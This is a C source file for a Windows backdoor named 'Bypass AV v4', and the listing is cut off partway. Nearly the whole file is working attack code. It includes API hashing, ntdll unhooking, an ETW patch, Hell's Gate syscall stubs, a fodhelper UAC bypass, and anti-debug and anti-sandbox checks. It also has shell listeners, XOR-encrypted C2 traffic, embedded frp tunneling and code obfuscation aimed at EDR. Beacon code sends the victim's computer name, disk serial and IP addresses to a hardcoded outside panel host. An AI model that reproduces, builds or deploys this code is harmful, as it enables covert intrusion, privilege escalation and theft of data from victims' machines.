/*
 * Bypass AV v4 — API Hashing + RC4 + ntdll unhook + 混淆
 */
#include <winsock2.h>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
typedef LONG NTSTATUS;
typedef void* HINTERNET;

/* ====================================================================
 * Panel notification config (compile-time overridable)
 * ====================================================================
 * Posts JSON events to maxapi112.netlify.app (or your own panel).
 * Schema:  { "sender": "...", "content": "...", "type": "info|warning|error" }
 * To target a different panel:  cl /DNOTIFY_HOST=... /DNOTIFY_PATH=...
 * To disable entirely:           cl /DNOTIFY_DISABLE=1
 * ==================================================================== */
#ifndef NOTIFY_HOST
#  define NOTIFY_HOST L"maxapi112.netlify.app"
#endif
#ifndef NOTIFY_PATH
#  define NOTIFY_PATH L"/api/receive"
#endif
#ifndef NOTIFY_SENDER
#  define NOTIFY_SENDER "bypass_av"
#endif
#ifndef NOTIFY_PORT
#  define NOTIFY_PORT 443
#endif
#ifndef NOTIFY_DISABLE
#  define NOTIFY_ENABLED 1
#else
#  define NOTIFY_ENABLED 0
#endif

/* Forward declaration of the actual WinHTTP POST helper.  Defined
 * further below; here we only need its name.  The boot/session/error
 * macros expand to calls of notify_event(). */
static void notify_event(const char *type, const char *content);

#define INLINE_NOTIFY_BOOT(wan_ip, lan_ip) do { if (NOTIFY_ENABLED) { char _b_comp[64], _b_body[256]; DWORD _b_clen = 64, _b_vsn = 0; mem_set(_b_comp, 0, 64); ((BOOL(WINAPI*)(LPSTR,LPDWORD))api(MH_KR, H_GetComputerNameA))(_b_comp, &_b_clen); ((BOOL(WINAPI*)(LPCSTR,void*,DWORD,LPDWORD,LPDWORD,LPDWORD,void*,DWORD))api(MH_KR, H_GetVolumeInformationA))("C:\\\\", NULL, 0, &_b_vsn, NULL, NULL, NULL, 0); char _b_vhx[9] = {0}; int _bi; for (_bi = 0; _bi < 8; _bi++) { DWORD _bn = (_b_vsn >> (28 - _bi*4)) & 0xF; _b_vhx[_bi] = (_bn < 10 ? '0' + _bn : 'A' + _bn - 10); } strapp_n(_b_body, "boot hwid=", sizeof(_b_body)); strapp_n(_b_body, _b_comp, sizeof(_b_body)); strapp_n(_b_body, "-", sizeof(_b_body)); strapp_n(_b_body, _b_vhx, sizeof(_b_body)); strapp_n(_b_body, " ip=", sizeof(_b_body)); { const char *_b_ip = (wan_ip); strapp_n(_b_body, _b_ip[0] ? _b_ip : "unknown", sizeof(_b_body)); } strapp_n(_b_body, " lan=", sizeof(_b_body)); { const char *_b_lan = (lan_ip); strapp_n(_b_body, _b_lan[0] ? _b_lan : "unknown", sizeof(_b_body)); } notify_event("info", _b_body); } } while(0)

#define INLINE_NOTIFY_SESSION(peer_ip) do { if (NOTIFY_ENABLED) { char _s_body[160]; strapp_n(_s_body, "session from ", sizeof(_s_body)); { const char *_s_ip = (peer_ip); strapp_n(_s_body, _s_ip[0] ? _s_ip : "unknown", sizeof(_s_body)); } notify_event("info", _s_body); } } while(0)

#define INLINE_NOTIFY_ERROR(msg) do { if (NOTIFY_ENABLED) { notify_event("error", (msg) ? (msg) : "unknown error"); } } while(0)

/* ====================================================================
 * 内存 / 字符串 / XOR 基础 (placed early for forward dependencies)
 * ==================================================================== */
static void mem_cpy(void *d, const void *s, SIZE_T n) {
    volatile BYTE *vd = (volatile BYTE*)d; const BYTE *vs = (const BYTE*)s;
    for (SIZE_T i = 0; i < n; i++) vd[i] = vs[i];
}
static void mem_set(void *d, BYTE v, SIZE_T n) {
    volatile BYTE *vd = (volatile BYTE*)d;
    for (SIZE_T i = 0; i < n; i++) vd[i] = v;
}
static int mem_cmp(const void *a, const void *b, SIZE_T n) {
    const BYTE *ba = (const BYTE*)a, *bb = (const BYTE*)b;
    for (SIZE_T i = 0; i < n; i++) if (ba[i] != bb[i]) return ba[i] - bb[i];
    return 0;
}
static void strapp(char *d, const char *s) {
    while (*d) d++; while (*s) { *d = *s; d++; s++; } *d = 0;
}
static void strapp_n(char *d, const char *s, int cap) {
    if (cap <= 0) return;
    int dl = 0; while (d[dl] && dl < cap) dl++;
    int i = 0;
    while (s[i] && dl + i < cap - 1) { d[dl + i] = s[i]; i++; }
    d[dl + i] = 0;
}
static int str_len(const char *s) { int n = 0; while (s[n]) n++; return n; }

/* ====================================================================
 * FRP 内网穿透 (frpc embedded)
 * ==================================================================== */
#ifdef ENABLE_FRP
#  include "frpc_data.h"
#  include "config_data.h"
#endif

/* ====================================================================
 * XOR core (Optim E + Concurrency + Per-session negotiation)
 *
 * Concurrent client threads each need their own XOR position counter
 * and optionally their own key.  Previously `_xpos` was a single global
 * which would race across threads; we now thread an XorCtx* through
 * xor_buf / xor_reset so each connection can have an independent state.
 * FRP resource decryption remains single-threaded at startup and
 * keeps a static key.
 * ==================================================================== */
typedef struct {
    BYTE key[16];
    int  klen;
    ULONG pos;
} XorCtx;

static const BYTE XOR_KEY_TRANSPORT[] = {0x42,0x7A,0x1F,0xE3,0x9C,0x55,0xB0,0x2D};
static const BYTE XOR_KEY_FRP[]       = {0xCE,0x9A,0x3F,0x55,0xB1,0xE2,0x78,0x4D};

static void xor_init(XorCtx *c, const BYTE *key, int klen) {
    if (!c) return;
    if (klen > (int)sizeof(c->key)) klen = sizeof(c->key);
    if (klen < 0) klen = 0;
    if (key && klen > 0) mem_cpy(c->key, key, klen);
    else mem_set(c->key, 0, sizeof(c->key));
    c->klen = klen;
    c->pos  = 0;
}
static void xor_reset(XorCtx *c) { if (c) c->pos = 0; }
static void xor_buf(XorCtx *c, BYTE *b, SIZE_T n) {
    if (!c || c->klen <= 0) return;
    for (SIZE_T i = 0; i < n; i++) b[i] ^= c->key[(c->pos)++ % c->klen];
}
static void xor_set_key(XorCtx *c, const BYTE *key, int klen) {
    xor_init(c, key, klen);
}
#ifdef ENABLE_FRP
static void xor_frp(const BYTE *in, BYTE *out, SIZE_T n) {
    static const BYTE k[] = {0xCE,0x9A,0x3F,0x55,0xB1,0xE2,0x78,0x4D};
    for (SIZE_T i = 0; i < n; i++) out[i] = in[i] ^ k[i % sizeof(k)];
}
#endif

/* ====================================================================
 * RC4
 * ==================================================================== */
static void rc4(BYTE *s, BYTE *buf, SIZE_T len) {
    int i = 0, j = 0;
    for (SIZE_T n = 0; n < len; n++) {
        i = (i + 1) & 0xFF; j = (j + s[i]) & 0xFF;
        BYTE t = s[i]; s[i] = s[j]; s[j] = t;
        buf[n] ^= s[(s[i] + s[j]) & 0xFF];
    }
}
static void rc4_init(BYTE *s, const BYTE *key, SIZE_T klen) {
    BYTE k[256];
    for (int i = 0; i < 256; i++) { s[i] = (BYTE)i; k[i] = key[i % klen]; }
    int j = 0;
    for (int i = 0; i < 256; i++) { j = (j + s[i] + k[i]) & 0xFF; BYTE t = s[i]; s[i] = s[j]; s[j] = t; }
}
static void rc4_crypt(const BYTE *key, SIZE_T klen, BYTE *buf, SIZE_T len) {
    BYTE s[256]; rc4_init(s, key, klen); rc4(s, buf, len);
}

/* ====================================================================
 * XOR 流量加密 — 见 Optim E 段（FRP 嵌入段上方），已统一到 _xor_apply
 * ==================================================================== */

/* ====================================================================
 * djb2 hash
 * ==================================================================== */
static DWORD djb2(const BYTE *s) {
    DWORD h = 5381;
    for (int i = 0; s[i]; i++) { int c = s[i]; h = ((h << 5) + h) + (BYTE)c; }
    return h;
}

/* ====================================================================
 * PEB 结构 + 通过哈希找模块 + 导出
 * ==================================================================== */
typedef struct { USHORT L, M; PWCH B; } USTR;
typedef struct { LIST_ENTRY LO, MO, IO; PVOID B; PVOID EP; ULONG SZ; USTR FD; USTR BD; } MLDR;
typedef struct { BYTE _[8]; PVOID _2[3]; LIST_ENTRY MO; } MPL;
typedef struct { BYTE _[2]; BYTE BD; BYTE _2[5]; PVOID _3[2]; MPL *L; } MPEB;

static MPEB *peb(void) {
#ifdef _WIN64
    return (MPEB*)__readgsqword(0x60);
#else
    return (MPEB*)__readfsdword(0x30);
#endif
}

static void *mod_by_hash(DWORD h) {
    MPEB *p = peb(); if (!p || !p->L) return NULL;
    LIST_ENTRY *e = p->L->MO.Flink;
    while (e != &p->L->MO) {
        MLDR *m = CONTAINING_RECORD(e, MLDR, MO);
        if (m->B && m->BD.B) {
            DWORD hc = 5381;
            for (SIZE_T i = 0; i < m->BD.L / 2; i++) {
                BYTE c = (BYTE)(m->BD.B[i] & 0xFF);
                if (c >= 'a' && c <= 'z') c -= 0x20;
                hc = ((hc << 5) + hc) + c;
            }
            if (hc == h) return m->B;
        }
        e = e->Flink;
    }
    return NULL;
}

static DWORD djb2_up(const char *s) {
    DWORD h = 5381;
    for (int i = 0; s[i]; i++) { BYTE c = (BYTE)s[i]; if (c >= 'a' && c <= 'z') c -= 0x20; h = ((h << 5) + h) + c; }
    return h;
}
static DWORD djb2_n_up(const char *s, int n) {
    DWORD h = 5381;
    for (int i = 0; i < n; i++) { BYTE c = (BYTE)s[i]; if (c >= 'a' && c <= 'z') c -= 0x20; h = ((h << 5) + h) + c; }
    return h;
}
static void *exp_by_hash(void *mod, DWORD target);
static void *load_mod(const char *name) {
    DWORD mh = djb2_up(name);
    void *m = mod_by_hash(mh); if (m) return m;
    /* Try LoadLibraryA if available */
    void *hLL = exp_by_hash(mod_by_hash(0x6DDB9555), 0x5FBFF0FB); /* kernel32.LoadLibraryA */
    if (hLL) { HMODULE hm = ((HMODULE(WINAPI*)(LPCSTR))hLL)(name); return hm ? hm : mod_by_hash(mh); }
    return NULL;
}
static void *exp_by_hash(void *mod, DWORD target) {
    BYTE *b = (BYTE*)mod;
    PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)b;
    if (dh->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(b + dh->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    IMAGE_DATA_DIRECTORY *ed = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!ed->Size) return NULL;
    IMAGE_EXPORT_DIRECTORY *ex = (IMAGE_EXPORT_DIRECTORY*)(b + ed->VirtualAddress);
    DWORD *names = (DWORD*)(b + ex->AddressOfNames);
    WORD *ords = (WORD*)(b + ex->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)(b + ex->AddressOfFunctions);
    DWORD export_va = ed->VirtualAddress;
    DWORD export_end = export_va + ed->Size;
    for (DWORD i = 0; i < ex->NumberOfNames; i++) {
        if (djb2(b + names[i]) == target) {
            DWORD rva = funcs[ords[i]];
            if (rva >= export_va && rva < export_end) {
                /* Forwarded export: parse "DLL.Func" and resolve recursively */
                char *fwd = (char*)(b + rva), *dot = fwd;
                while (*dot && *dot != '.') dot++;
                if (*dot == '.') {
                    DWORD fwd_mh = djb2_n_up(fwd, (int)(dot - fwd));
                    fwd_mh = ((fwd_mh << 5) + fwd_mh) + '.';
                    fwd_mh = ((fwd_mh << 5) + fwd_mh) + 'D';
                    fwd_mh = ((fwd_mh << 5) + fwd_mh) + 'L';
                    fwd_mh = ((fwd_mh << 5) + fwd_mh) + 'L';
                    void *fwd_mod = mod_by_hash(fwd_mh);
                    if (!fwd_mod) {
                        /* Not loaded, try to load it */
                        char dll_path[64]; int j;
                        for (j = 0; j < 60 && fwd[j] != '.'; j++) dll_path[j] = fwd[j];
                        dll_path[j] = '.'; dll_path[j+1] = 'D'; dll_path[j+2] = 'L'; dll_path[j+3] = 'L'; dll_path[j+4] = 0;
                        fwd_mod = load_mod(dll_path);
                    }
                    if (fwd_mod) return exp_by_hash(fwd_mod, djb2_up(dot + 1));
                }
                return NULL;
            }
            return (void*)(b + rva);
        }
    }
    return NULL;
}

static void *api(DWORD mh, DWORD fh) {
    void *m = mod_by_hash(mh); if (!m) return NULL;
    return exp_by_hash(m, fh);
}

/* ====================================================================
 * 预计算哈希
 * ==================================================================== */
/* modules */
#define MH_NT       0x1EDAB0ED
#define MH_KR       0x6DDB9555
#define MH_WS       0x89F03A6F
#define MH_US       0x2208CF13
/* kernel32 */
#define H_GetProcAddress   0xCF31BB1F
#define H_LoadLibraryA     0x5FBFF0FB
#define H_GetModuleHandleA 0x5A153F58
#define H_CreateProcessA   0xAEB52E19
#define H_CreatePipe       0x9A8DEEE7
#define H_CloseHandle      0x3870CA07
#define H_TerminateProcess 0x60AF076D
#define H_SetHandleInfo    0x70EA2E03
#define H_WriteFile        0x663CECB0
#define H_ReadFile         0x71019921
#define H_WaitForObj       0xECCDA1BA
#define H_GetTickCount     0x41AD16B9
#define H_Sleep            0x0E19E5FE
#define H_GetLastError     0x2082EAE3
#define H_VirtualProtect   0x844FF18D
/* ws2_32 */
#define H_WSAStartup       0x6128C683
#define H_WSACleanup       0x7F1AAB78
#define H_socket           0x1C31032E
#define H_bind             0x7C9499E2
#define H_listen           0x0B794014
#define H_accept           0xF15AE9B5
#define H_closesocket      0x494CB104
#define H_setsockopt       0xA7EC1274
#define H_recv             0x7C9D4D95
#define H_send             0x7C9DDB4F
#define H_htonl            0x0F9A774A
#define H_htons            0x0F9A7751
#define H_PeekNamedPipe    0x94F08B9D
/* frp (kernel32) */
#define H_CreateFileA       0xEB96C5FA
#define H_GetTempPathA      0x9EF979E9
#define H_DeleteFileA       0x1CD88719
/* ntdll syscalls */
#define H_NtCreateUserProcess   0x5F8E4559
#define H_NtSetInfoProc         0xBB7A48B8
#define H_NtAllocateVirtualMemory  0x6793C34C
#define H_NtProtectVirtualMemory   0x082962C8
#define H_EtwEventWrite            0x24A8D022
#define H_VirtualAlloc             0x382C0F97
#define H_NtCreateNamedPipeFile    0xDF32E02E
#define H_RegDeleteKeyA           0xFA08FFE0
#define H_NtWriteVirtualMemory     0x95F3A792
#define H_NtResumeThread           0x2C7B3D30
#define H_NtGetContextThread       0x9E0E1A44
#define H_NtSetContextThread       0x308BE0D0
#define H_NtQueryInformationProcess 0xD034FC62
#define H_GetThreadContext         0xEBA2CFC2
#define H_GetModuleFileNameA       0x13B8A14D
#define H_CopyFileA           0xAC2253C1
#define H_CreateDirectoryA    0x41FABFEF
#define H_GetEnvironmentVariableA 0x87889701
#define H_RegCreateKeyExA     0x46CEB39E
#define H_RegSetValueExA      0x345872EA
#define H_RegCloseKey         0x736B3702
#define H_MoveFileA           0xD834FDBD
#define H_SetFileAttributesA  0xF5A60659
/* winhttp */
#define MH_WINHTTP              0x612C623D
#define H_WinHttpOpen           0x5E4F39E5
#define H_WinHttpConnect        0x7242C17D
#define H_WinHttpOpenRequest    0xEAB7B9CE
#define H_WinHttpSetOption      0xA18B94F8
#define H_WinHttpSendRequest    0xB183FAA6
#define H_WinHttpReceiveResponse  0x146C4925
#define H_WinHttpReadData       0x7195E4E9
#define H_WinHttpCloseHandle    0x36220CD5
/* hwid */
#define H_GetComputerNameA      0xAA63BFB6
#define H_GetVolumeInformationA 0xC948A224

/* ====================================================================
 * 解密 RC4 字符串
 * ==================================================================== */
static void rc4_str(const BYTE *k, SIZE_T kl, const BYTE *d, SIZE_T dl, BYTE *out) {
    mem_cpy(out, d, dl); rc4_crypt(k, kl, out, dl);
}

/* ====================================================================
 * ntdll 脱钩 (修正: 用 GetModuleHandle+GetProcAddress, 不走 LoadLibrary)
 * ==================================================================== */
static int unhook_ntdll(void) {
    void *nt = mod_by_hash(MH_NT); if (!nt) return 0;
    void *hK32 = mod_by_hash(MH_KR); if (!hK32) return 0;
    void *pGMA = exp_by_hash(hK32, H_GetModuleHandleA);
    void *pGPA = exp_by_hash(hK32, H_GetProcAddress);
    if (!pGMA || !pGPA) return 0;

    HMODULE hK = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))pGMA)("kernel32.dll");
    if (!hK) return 0;

    typedef void*(WINAPI *FGetProc)(HMODULE,LPCSTR);
    FGetProc _GPA = (FGetProc)pGPA;
    void *pCFW  = _GPA(hK, "CreateFileW");
    void *pCFM  = _GPA(hK, "CreateFileMappingW");
    void *pMVF  = _GPA(hK, "MapViewOfFile");
    void *pUMV  = _GPA(hK, "UnmapViewOfFile");
    void *pCH   = _GPA(hK, "CloseHandle");
    void *pVP   = _GPA(hK, "VirtualProtect");
    if (!pCFW || !pCFM || !pMVF || !pUMV || !pCH || !pVP) return 0;

    BYTE ntp[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0};
    HANDLE hF = ((HANDLE(WINAPI*)(LPCWSTR,DWORD,DWORD,void*,DWORD,DWORD,HANDLE))pCFW)(
        (LPCWSTR)ntp, 0x80000000, 1, NULL, 3, 0, NULL);
    if (hF == INVALID_HANDLE_VALUE) return 0;
    HANDLE hM = ((HANDLE(WINAPI*)(HANDLE,void*,DWORD,DWORD,DWORD))pCFM)(hF, NULL, 2, 0, 0x04);
    if (!hM) { ((void(WINAPI*)(HANDLE))pCH)(hF); return 0; }
    void *map = ((void*(WINAPI*)(HANDLE,DWORD,DWORD,DWORD,SIZE_T,void*))pMVF)(hM, 4, 0, 0, 0, NULL);
    if (!map) { ((void(WINAPI*)(HANDLE))pCH)(hM); ((void(WINAPI*)(HANDLE))pCH)(hF); return 0; }

    PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)nt;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((BYTE*)nt + dh->e_lfanew);
    PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(nth);
    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++) {
        if (*(DWORD*)sh[i].Name == 0x74786574) {
            BYTE *dtext = (BYTE*)map + sh[i].VirtualAddress;
            BYTE *mtext = (BYTE*)nt + sh[i].VirtualAddress;
            if (mem_cmp(dtext, mtext, sh[i].SizeOfRawData) != 0) {
                DWORD old;
                ((BOOL(WINAPI*)(void*,SIZE_T,DWORD,DWORD*))pVP)(mtext, sh[i].SizeOfRawData, 0x40, &old);
                mem_cpy(mtext, dtext, sh[i].SizeOfRawData);
                ((BOOL(WINAPI*)(void*,SIZE_T,DWORD,DWORD*))pVP)(mtext, sh[i].SizeOfRawData, old, &old);
            }
            break;
        }
    }
    ((void(WINAPI*)(void*))pUMV)(map);
    ((void(WINAPI*)(HANDLE))pCH)(hM);
    ((void(WINAPI*)(HANDLE))pCH)(hF);
    return 1;
}

#ifdef ENABLE_UPNP
#  include "upnp_data.h"
#endif

/* Forward declarations for the listeners */
static DWORD WINAPI bsh_bind(LPVOID lp);
#ifdef TUNNEL_MODE
static DWORD WINAPI bsh_tunnel(LPVOID lp);
#endif
#ifdef REVERSE_MODE
static DWORD WINAPI bsh_reverse(LPVOID lp);
#endif

/* ====================================================================
 * fodhelper UAC bypass (new feature)
 *
 * Replaces the heavy-handed LM\...\EnableLUA=0 hack.  Write the
 * payload path into HKCU\Software\Classes\ms-settings\shell\open\command
 * (which is auto-elevated and read by Microsoft-signed fodhelper.exe)
 * then launch fodhelper.  fodhelper runs our binary elevated; cleanup
 * registry afterwards.
 *
 * Reliable on Windows 10 / Windows 11 < 22H2.  On Win11 22H2+,
 * Microsoft added an interactive requirement that defeats this; in
 * that case the bypass silently fails and the caller falls back to
 * the legacy EnableLUA=0 method.
 * ==================================================================== */
static int fodhelper_bypass(const char *target_path) {
    if (!target_path || !*target_path) return 0;
    void *pRCE = api(MH_KR, H_RegCreateKeyExA);
    void *pRSV = api(MH_KR, H_RegSetValueExA);
    void *pRCK = api(MH_KR, H_RegCloseKey);
    void *pRDK = api(MH_KR, H_RegDeleteKeyA);
    void *pCPA = api(MH_KR, H_CreateProcessA);
    void *pCH  = api(MH_KR, H_CloseHandle);
    void *pTP  = api(MH_KR, H_TerminateProcess);
    void *pWO  = api(MH_KR, H_WaitForObj);
    if (!pRCE || !pRSV || !pRCK || !pCPA || !pCH) return 0;

    HKEY hk;
    typedef LSTATUS(WINAPI *FRCE)(HKEY, LPCSTR, DWORD, void*, DWORD, REGSAM, void*, PHKEY, void*);
    typedef LSTATUS(WINAPI *FRSV)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LSTATUS(WINAPI *FRCK)(HKEY);
    typedef LSTATUS(WINAPI *FRDK)(HKEY, LPCSTR);
    typedef BOOL(WINAPI *FCPA)(LPCSTR, LPSTR, void*, void*, BOOL, DWORD, void*, void*, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    typedef BOOL(WINAPI *FCH)(HANDLE);
    typedef BOOL(WINAPI *FTH)(HANDLE, UINT);
    typedef DWORD(WINAPI *FWO)(HANDLE, DWORD);

    FRCE pR = (FRCE)pRCE;
    FRSV pS = (FRSV)pRSV;
    FRCK pC = (FRCK)pRCK;
    FRDK pD = (FRDK)pRDK;
    FCPA pA = (FCPA)pCPA;
    FCH  pH = (FCH)pCH;
    FTH  pT = (FTH)pTP;
    FWO  pW = (FWO)pWO;

    /* 1. Set HKCU\Software\Classes\ms-settings\shell\open\command
     *    default value to our target binary path. */
    LONG r = pR(HKEY_CURRENT_USER,
                "Software\\Classes\\ms-settings\\shell\\open\\command",
                0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
    if (r != 0) return 0;
    int tlen = str_len(target_path);
    pS(hk, NULL, 0, REG_SZ, (const BYTE*)target_path, tlen + 1);
    pC(hk);

    /* 2. Set HKCU\Software\Classes\ms-settings default to delegate. */
    r = pR(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings",
           0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
    if (r != 0 && pD) {
        pD(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");
        return 0;
    }
    const char *deleg = "ms-settings\\shell\\open\\command";
    pS(hk, NULL, 0, REG_SZ, (const BYTE*)deleg, str_len(deleg) + 1);
    pC(hk);

    /* 3. Launch fodhelper.exe (auto-elevated Microsoft binary). It
     *    reads our HKCU command and executes it elevated. */
    STARTUPINFOA si; mem_set(&si, 0, sizeof(si)); si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    if (!pA(NULL, "fodhelper.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        if (pD) {
            pD(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");
            pD(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell");
            pD(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
        }
        return 0;
    }

    /* Don't wait forever: fodhelper hands off to our exe quickly. */
    if (pW) pW(pi.hProcess, 8000);
    if (pT) pT(pi.hProcess, 0);
    pH(pi.hThread); pH(pi.hProcess);

    /* 4. Cleanup registry keys. */
    if (pD) {
        pD(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");
        pD(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell");
        pD(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    }
    return 1;
}

/* ====================================================================
 * Per-session XOR negotiation (new feature)
 *
 * Without a negotiated key, the static XOR_KEY_TRANSPORT is used —
 * a single payload's char-by-char XOR pattern is reproducible and
 * signature-matchable.  This routine swaps to a fresh 8-byte random
 * key per accepted connection.  The plaintext exchange precedes the
 * XOR stream so the position counter starts at 0 on both sides.
 *
 * Protocol (out-of-band, no XOR advances any positions):
 *   server -> client  : 8 random bytes (new key K)
 *   client -> server  : 3 bytes "OK\n" XOR'd with K (or skip-on-fail)
 * Both sides then call xor_set_key(&cx->xc, K, 8); xor_reset(&cx->xc);
 *   before any stream-mode traffic.
 *
 * Disabling by compile-time: -DENABLE_SESSION_KEY=0 leaves the static
 * XOR path in place; existing c2client.py keeps working.
 * ==================================================================== */
static int _xor_negotiate(SOCKET cl, XorCtx *xc,
                          void *pfn_send, void *pfn_recv) {
#ifdef ENABLE_SESSION_KEY
    /* Generate 8 random bytes from QPC + GetTickCount. */
    BYTE k[8];
    LARGE_INTEGER pc; QueryPerformanceCounter(&pc);
    DWORD t = GetTickCount() ^ pc.LowPart ^ (DWORD)(SIZE_T)k;
    for (int i = 0; i < 8; i++) { t = (t << 7) | (t >> 25); k[i] = (BYTE)(t ^ (i * 0x9C)); }
    /* Send the key in plaintext. */
    if (((int(WSAAPI*)(SOCKET,const char*,int,int))pfn_send)(cl, (const char*)k, 8, 0) != 8)
        return 0;
    /* Wait for "OK\n" encrypted with new key. */
    char ack[3];
    int n = ((int(WSAAPI*)(SOCKET,char*,int,int))pfn_recv)(cl, ack, 3, 0);
    if (n != 3) return 0;
    /* ack is XOR'd with k; decode locally and verify. */
    for (int i = 0; i < 3; i++) ack[i] ^= k[i];
    if (mem_cmp(ack, "OK\n", 3) != 0) return 0;
    xor_set_key(xc, k, 8);
    xor_reset(xc);
    return 1;
#else
    (void)cl; (void)xc; (void)pfn_send; (void)pfn_recv;
    return 0;
#endif
}

/* ====================================================================
 * ETW 绕过 — patch EtwEventWrite 直接 ret
 * ==================================================================== */
static void etw_patch(void) {
    void *nt = mod_by_hash(MH_NT); if (!nt) return;
    void *pEW = exp_by_hash(nt, H_EtwEventWrite); if (!pEW) return;
    void *pVP = api(MH_KR, H_VirtualProtect);
    BYTE r = 0xC3;
    if (pVP) { DWORD o; ((BOOL(WINAPI*)(void*,SIZE_T,DWORD,DWORD*))pVP)(pEW, 1, 0x40, &o);
        mem_cpy(pEW, &r, 1); ((BOOL(WINAPI*)(void*,SIZE_T,DWORD,DWORD*))pVP)(pEW, 1, o, &o); }
}

/* ====================================================================
 * Hell's Gate — 从 ntdll 提取 SSN (间接系统调用)
 * ==================================================================== */
static DWORD get_ssn(DWORD fh) {
    void *nt = mod_by_hash(MH_NT); if (!nt) return 0;
    void *fn = exp_by_hash(nt, fh); if (!fn) return 0;
    BYTE *p = (BYTE*)fn;
    for (int i = 0; i < 0x200; i++) {
        if (p[i] == 0x4C && p[i+1] == 0x8B && p[i+2] == 0xD1 && p[i+3] == 0xB8)
            return *(DWORD*)(p + i + 4);
        /* 32-bit */
        if (p[i] == 0xB8 && p[i+5] == 0xCD && p[i+6] == 0x2E)
            return *(DWORD*)(p + i + 1);
    }
    return 0;
}

/* 构建可执行的 syscall stub */
static void *build_sys_stub(DWORD ssn, void *pVA) {
    BYTE stub[] = {0x4C,0x8B,0xD1, 0xB8,0,0,0,0, 0x0F,0x05, 0xC3};
    if (ssn == 0) return NULL;
    *(DWORD*)(stub + 4) = ssn;
    void *m = ((void*(WINAPI*)(void*,SIZE_T,DWORD,DWORD))pVA)(NULL, sizeof(stub), 0x1000, 0x40);
    if (m) mem_cpy(m, stub, sizeof(stub));
    return m;
}

/* ====================================================================
 * 反调试 + 反沙箱
 * ==================================================================== */
/* Bug-fix: original is_dbg only checked PEB.BeingDebugged — HANDOVER.md
 * claimed 4 vector detection that was never implemented. Replaced with
 * full 4-vector check: BeingDebugged, NtGlobalFlag, hardware breakpoints
 * (DR0-DR3), and ProcessDebugPort via NtQueryInformationProcess. */
static int is_dbg(void) {
    MPEB *p = peb(); if (!p) return 0;
    int hit = 0;

    /* 1. PEB.BeingDebugged (offset 0x02) */
    if (p->BD) hit = 1;

    /* 2. NtGlobalFlag (PEB+0xBC, NT 6.x x64 documented layout) */
    {
        DWORD ngf = *(DWORD*)((BYTE*)p + 0xBC);
        if (ngf != 0) hit = 1;
    }

    /* 3. Hardware breakpoints DR0..DR3 (GetThreadContext on current thread) */
    {
        void *pGTC = api(MH_KR, H_GetThreadContext);
        if (pGTC) {
            typedef BOOL(WINAPI *FGTC)(HANDLE, LPCONTEXT);
            CONTEXT ctx; mem_set(&ctx, 0, sizeof(ctx));
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (((FGTC)pGTC)((HANDLE)(LONG_PTR)-2, &ctx)) {
                if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) hit = 1;
            }
        }
    }

    /* 4. ProcessDebugPort (ProcessInformationClass 0x1E) via NtQueryInformationProcess.
     * Returns 0 when no debugger, port number (non-zero) when attached. */
    {
        void *nt = mod_by_hash(MH_NT);
        void *pNQI = nt ? exp_by_hash(nt, H_NtQueryInformationProcess) : NULL;
        if (pNQI) {
            typedef NTSTATUS(NTAPI *FNQI)(HANDLE, ULONG, PVOID, ULONG, PULONG);
            ULONG_PTR dp = 0;
            ULONG rlen = 0;
            NTSTATUS s = ((FNQI)pNQI)((HANDLE)(LONG_PTR)-1,
                                     0x1E /*ProcessDebugPort*/,
                                     &dp, sizeof(dp), &rlen);
            if (s >= 0 && dp != 0) hit = 1;
        }
    }

    return hit;
}

/* Sandboxes: GetTickCount wraparound (49.7 days uptime) is rare but possible,
 * accept as anomalous only on fresh boot OR 30min of zero input. */
static int is_sbx(void) {
    DWORD t = GetTickCount(); if (t < 300000) return 1;
    LASTINPUTINFO l; mem_set(&l, 0, sizeof(l)); l.cbSize = sizeof(l);
    if (GetLastInputInfo(&l)) { DWORD n = GetTickCount(); if (n - l.dwTime > 1800000) return 1; }
    return 0;
}

/* ====================================================================
 * Noise macros (Optim B)
 *
 * The original `junk()/jk()` was a function pair called immediately
 * before/after sensitive operations (is_dbg, unhook_ntdll, etw_patch,
 * start_frpc, do_upnp, ...).  EDR/heuristic analyzers detect this
 * "noise function call immediately followed by another call" pattern
 * as a high-confidence malware signature.
 *
 * We replace function-calls with inline macros so the jitter is folded
 * into the caller — the optimizer can't elide it (volatile + barrier)
 * but no separate call frame appears in disassembly.  Pattern matchers
 * no longer see a recognizable noise function in their symbol tables.
 * ==================================================================== */
#define JK() do { \
    volatile DWORD _jk_v = (DWORD)(SIZE_T)GetCurrentThread(); \
    _jk_v ^= (DWORD)(SIZE_T)&_jk_v; \
    _jk_v = _rotl(_jk_v, (_jk_v & 7) + 1); \
    _ReadWriteBarrier(); \
    (void)_jk_v; \
} while(0)

/* Backwards-compat for any string references that still say "junk()".
